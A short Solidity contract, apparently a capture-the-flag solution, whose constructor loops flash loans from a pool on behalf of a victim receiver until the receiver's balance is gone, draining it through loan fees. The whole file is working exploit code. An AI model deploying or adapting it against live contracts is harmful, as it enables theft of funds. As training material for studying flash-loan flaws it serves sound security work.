// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface IPool {
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data) external;
}

contract AttackNR {
    address ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor (address receiver, address pool) {
      while (receiver.balance>0) {
        IPool(pool).flashLoan(IERC3156FlashBorrower(receiver),ETH,1,"0x");
      }
    }
}
